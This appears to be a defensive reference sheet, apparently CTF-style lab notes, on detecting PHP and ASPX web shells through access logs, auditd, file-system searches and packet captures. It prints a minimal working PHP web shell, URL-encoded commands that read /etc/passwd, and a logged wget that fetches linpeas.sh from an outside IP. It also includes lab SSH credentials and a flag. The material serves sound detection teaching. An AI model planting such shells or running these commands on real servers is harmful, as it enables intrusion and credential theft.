# 🐚 Detecting Web Shells — Reference Sheet

> **TL;DR:** Web shells are malicious scripts uploaded to a web server (often via file upload vulnerabilities) that give attackers remote command execution. Detection relies on correlating **three signal sources**: web server access logs (request patterns, User-Agents, query strings), file system analysis (`find`, `grep` for suspicious scripts), and network traffic captures (POST payloads, encoded commands). MITRE maps this to **T1505.003 — Server Software Component: Web Shell**.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| Web shells are both initial access AND persistence | Same artifact serves two MITRE tactics — don't think of them as just "entry points." |
| WordPress/Django store code in databases | File system scans won't catch malicious code injected into posts, themes, or settings. Database review is also needed. |
| Double extensions hide malicious files | `image.jpg.php` looks like an image but PHP still executes it. Always check the **last** extension. |
| `/tmp` is often writable and overlooked | Loose file permissions on temp dirs are a common web shell landing spot. |
| Missing referrer ≠ always malicious | Privacy-conscious browsers and direct URL access also produce no referrer. Treat as **one** indicator among many. |
| Outdated User-Agents are red flags | `Mozilla/4.0 (compatible; MSIE 6.0)` — IE6 was released in 2001. Real users aren't running it in 2025. |
| `curl`/`wget` User-Agents in production traffic | Legitimate sites rarely see these from end users; they're a strong signal of scripting/automation. |
| Base64 query strings hide commands | `?query=d2hvYW1p` is base64 for `whoami`. Always decode suspicious encoded parameters. |
| Logs lose POST bodies | The actual web shell upload payload won't appear in access logs — need network capture or audit logs for that. |
| Web server processes spawning shells = critical signal | Apache/nginx spawning `/bin/sh`, `bash`, or `curl` is almost never legitimate. |
| `200 OK` during fuzzing = attacker found something | Status codes flip meaning depending on who's reading: `200` is good for users, but during fuzzing it means an attacker mapped a real endpoint. |
| URL encoding obscures commands | `%20` = space, `%27` = `'`, `%3C` = `<`. Always decode query strings before pattern matching. |

## 🧬 What Is a Web Shell?

| Aspect | Detail |
|---|---|
| **Definition** | Malicious program uploaded to a web server that enables remote command execution |
| **MITRE technique** | T1505.003 — Server Software Component: Web Shell |
| **Dual purpose** | Initial access (via file upload vulns) AND persistence (long-term reentry) |
| **Common deployment vectors** | File upload vulnerabilities, misconfigurations, prior system access |
| **Why they work** | Abuse of legitimate functions like `shell_exec()`, `exec()`, `system()`, `passthru()` |
| **Complexity range** | One-line URL command runners → full GUIs with file managers and password protection |

### Common File Extensions by Platform

| Platform | Typical Extensions |
|---|---|
| Linux / Apache + PHP | `.php` |
| Microsoft Exchange / IIS | **`.aspx`** |
| Java application servers | `.jsp` |

### Real-World Examples

| Threat Actor | Target | TTP |
|---|---|---|
| **Hafnium (ProxyLogon)** | Microsoft Exchange | Uploaded `.aspx` shells to `\inetpub\wwwroot\aspnet_client\`; modified files in `\install_path\FrontEnd\HttpProxy\owa\auth\` |
| **Conti Ransomware** | Microsoft Exchange | Dropped `aspnetclient_log.aspx` in same `\aspnet_client\` directory; mapped DCs and domain admins within minutes |

## 🧪 Anatomy of a PHP Web Shell

### Minimal Web Shell Structure

```php
<?php
$cmd = $_GET['cmd'];       // 1. Read user-supplied command from URL
echo shell_exec($cmd);     // 2. Execute it and display output
?>
```

### Execution Flow

| Step | What Happens |
|---|---|
| 1 | Check if `cmd` parameter is present in URL: `?cmd=whoami` |
| 2 | Store the user-supplied command in `$cmd` |
| 3 | Execute via `shell_exec()` (or `exec()`, `system()`, `passthru()`) |
| 4 | Display output back in HTTP response |

### Dangerous PHP Functions to Watch

| Function | Purpose | Abuse |
|---|---|---|
| `shell_exec()` | Run shell command, return all output | Direct command execution |
| `exec()` | Run external program | Direct command execution |
| `system()` | Execute external program, output as it runs | Direct command execution |
| `passthru()` | Execute program, output raw binary | Direct command execution |
| `eval()` | Evaluate string as PHP code | Run arbitrary PHP (e.g., obfuscated shell payloads) |
| `base64_decode()` | Decode base64 | Often combined with `eval()` to hide payloads |

## 🌐 Accessing a Web Shell

### Browser
```
http://10.10.10.100:8080/files/awebshell.php?cmd=whoami
```

### Command Line with curl
```bash
curl "http://MACHINE_IP:8080/files/awebshell.php?cmd=whoami"
```

### URL Encoding for Spaces and Special Chars

| Raw Command | URL-Encoded |
|---|---|
| `ls -la` | `ls%20-la` |
| `cat /etc/passwd` | `cat%20/etc/passwd` |
| `uname -a` | `uname%20-a` |
| `' OR '1'='1` | `%27%20OR%20%271%27%3D%271` |

**Encoding cheat sheet**: `%20` = space, `%27` = `'`, `%3D` = `=`, `%3C` = `<`, `%3E` = `>`.

Use **CyberChef** for encoding/decoding.

## 📜 Log-Based Detection

### HTTP Request Methods — Normal vs Abuse

| Method | Normal Usage | Possible Abuse |
|---|---|---|
| **GET** | Retrieve a resource | Recon or interacting with a web shell (`?cmd=whoami`) |
| **POST** | Submit data to the server | Upload or interact with a web shell |
| **PUT** | Upload or replace a file | Direct web shell upload |
| **DELETE** | Remove a resource | Cleanup methods (covering tracks) |
| **OPTIONS** | Request supported methods | Reconnaissance |
| **HEAD** | Like GET but returns only headers | Detect existence of files without downloading |

### Web Shell Indicators in Logs

| Indicator Category | What to Look For |
|---|---|
| **HTTP method patterns** | Repeated GETs (probing), POST after GETs (upload follow-up), repeated requests to same file (shell interaction) |
| **Suspicious User-Agents** | Altered (`Mozilla/4.0+(+Windows+NT+5.1)` shortened to `Mozilla/4.0`), outdated (IE6), blacklisted (`curl/`, `wget/`) |
| **Suspicious IPs** | Outside expected geo range; not matching normal internal traffic |
| **Query strings** | Long/odd strings; keywords like `cmd=`, `exec=`; base64-encoded payloads |
| **Missing referrer** | Direct access to internal endpoints (one signal among many) |
| **Unusual timestamps** | Activity outside business hours |
| **Response codes** | Repeated 404s (enumeration), unexpected 200s during fuzzing |

### Suspicious Request Example — Field-by-Field

A request like this is a stack of red flags:
```
203.0.113.66 - - [17/Jul/2025:03:14:22 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 273 "-" "curl/8.14.1"
```

| Field | Value | Why Suspicious |
|---|---|---|
| Client IP | `203.0.113.66` | Outside expected range |
| Timestamp | `03:14:22` | Outside business hours |
| Method + Path | `POST /uploads/shell.php` | Suspicious filename in writable dir |
| Query | `?cmd=whoami` | Command execution attempt |
| Referrer | `-` (missing) | Direct access, no normal navigation |
| User-Agent | `curl/8.14.1` | Scripting tool, not a real browser |

## 🔎 Auditd — Linux Audit Trail

| Aspect | Detail |
|---|---|
| **What it is** | Native Linux utility that records syscall events to `audit.log` |
| **Configurable** | Rules can match specific programs, files, directories |
| **Search tool** | `ausearch` |
| **Logs to** | `/var/log/audit/audit.log` |

### Useful Syscalls for Web Shell Detection

| Syscall | What It Indicates |
|---|---|
| **`creat`** | A new file was created on disk (e.g., webshell.php just uploaded) |
| **`execve`** | A program was executed (e.g., web server spawning a shell) |
| **`open`** | File was opened (possible read/modify of script) |
| **`unlink`** | File was deleted (attacker cleanup) |

### ausearch Usage

```bash
ausearch -k web_shell
# Search audit log for events matching the "web_shell" rule key
```

**Example output:**
```
time->Wed Jul 23 06:20:36 2025
"name = /uploads/webshell.php"
"OGID = www-data"
```

### Web Log + Auditd Correlation (Powerful Combo)

| Web Log Shows | Auditd Confirms | Combined Conclusion |
|---|---|---|
| Suspicious POST to `/upload.php` | `creat` syscall on new `.php` file | File was actually written |
| GET to `webshell.php?cmd=whoami` | `execve` of `/bin/sh` by `www-data` | Command execution confirmed |
| Repeated requests to same shell | `open`/`read` on shell file | Active shell usage |

## 📂 File System Analysis

### Common Web Server Directories

| Server | Default Web Root |
|---|---|
| **Apache** | `/var/www/html/` |
| **Nginx** | `/usr/share/nginx/html/` |

### Common Upload/Target Locations

| Path Pattern | Why Attackers Target It |
|---|---|
| `/uploads/` | Often writable for user uploads |
| `/images/` | Writable, accepts image uploads (then attackers slip in `.php.jpg`) |
| `/admin/` | Sometimes writable for admin functions |
| `/tmp/` | World-writable temp dir |
| `/wp-content/uploads/` | WordPress default upload dir |
| `\inetpub\wwwroot\aspnet_client\` | Exchange / IIS — Hafnium and Conti both used this |

### find — Locate Recently Modified Scripts

```bash
find /var/www -type f -name "*.php" -newerct "2025-07-01" ! -newerct "2025-08-01"
# Find .php files in /var/www modified between July 1 and August 1, 2025
# /var/www/html/uploads/awebshell.php  <-- suspicious result
```

```bash
find /var/www/ -type f -name "*.php"
# All .php files under /var/www/ (no date filter)
```

### grep — Hunt Suspicious Functions

```bash
grep -r "eval(" wp-content
# Recursively search WordPress content dir for eval() — commonly abused
# /wp-content/uploads/awebshell2.php :eval(b64_dd($['cmd']));
```

```bash
grep -r "shell_exec\|system\|passthru" /var/www/
# Hunt for multiple dangerous PHP functions at once
```

## 📡 Network Traffic Analysis

### Web Shell Indicators in Packet Captures

| Indicator | What Packets Reveal That Logs Don't |
|---|---|
| Unusual HTTP methods | Same as logs but with full headers |
| Suspicious User-Agents | Same as logs |
| **Encoded payloads** | Full base64/URL-encoded query strings + decoded view |
| **Malicious code in request bodies** | POST body contents — actual web shell source code uploaded |
| Unexpected protocols/ports | Non-HTTP traffic from web server (e.g., reverse shell connections) |
| **Web server spawning command-line tools** | Process behavior visible via correlated EDR |

### Wireshark HTTP Filters

| Filter | Purpose |
|---|---|
| `http` | Show only HTTP traffic |
| `http.request.method == "POST"` | Find POST requests (uploads, form submissions) |
| `http.request.method == "PUT"` | Find direct file uploads via PUT |
| `http.request.uri contains ".php"` | Find PHP file activity |
| `http.user_agent` | View all User-Agent values |
| `http.user_agent contains "curl"` | Spot scripting tool traffic |
| `ip.addr == 203.0.113.66` | Filter on a suspected attacker IP |

### Follow HTTP Stream
**Right-click any HTTP packet → Follow → HTTP Stream**
Reconstructs the full request+response sequence — essential for seeing the actual shell payload uploaded or commands executed.

## 🕵️ Investigation Walkthrough (Task 6: WordPress Site)

### Setup
- **Log file:** `/var/log/apache2/access.log`
- **Web shell location:** `/var/www/html/wordpress/wp-content/uploads/`
- **SSH credentials:** `ubuntu` / `TryHackMe!`

### Investigation Pattern (`grep` Workflow)

| Goal | Command |
|---|---|
| Find 404 enumeration attempts | `cat /var/log/apache2/access.log \| grep "404"` |
| Find successful page hits | `cat /var/log/apache2/access.log \| grep "200"` |
| Find POSTs (uploads/login) | `cat /var/log/apache2/access.log \| grep "POST"` |
| Investigate specific shell | `grep "shadyshell.php" /var/log/apache2/access.log` |
| Filter shell command activity | `grep "shadyshell.php" /var/log/apache2/access.log \| grep "cmd="` |

### Reading `cmd=` Parameters

URL-decoded examples from the investigation:

| URL Parameter | Decoded Command |
|---|---|
| `?cmd=whoami` | `whoami` |
| `?cmd=id` | `id` |
| `?cmd=uname%20-a` | `uname -a` |
| `?cmd=ls%20-la%20/home` | `ls -la /home` |
| `?cmd=cat%20/etc/passwd` | `cat /etc/passwd` |
| `?cmd=wget%20http://203.0.113.66:8000/linpeas.sh` | `wget http://203.0.113.66:8000/linpeas.sh` |

> **Pattern**: When investigating a known web shell, isolate its filename with `grep`, then look at the `cmd=` query strings to reconstruct the attacker's full command history.

### Reading the Web Shell Source

```bash
cat /var/www/html/wordpress/wp-content/uploads/shadyshell.php
# <?php system($_GET['cmd']); ?>
# <!-- FLAG: THM{W3b_Sh3ll_Int3rnals} -->
```

Attackers sometimes hide artifacts (notes, IDs, flags) in HTML comments — always `cat` suspicious shell files in full.
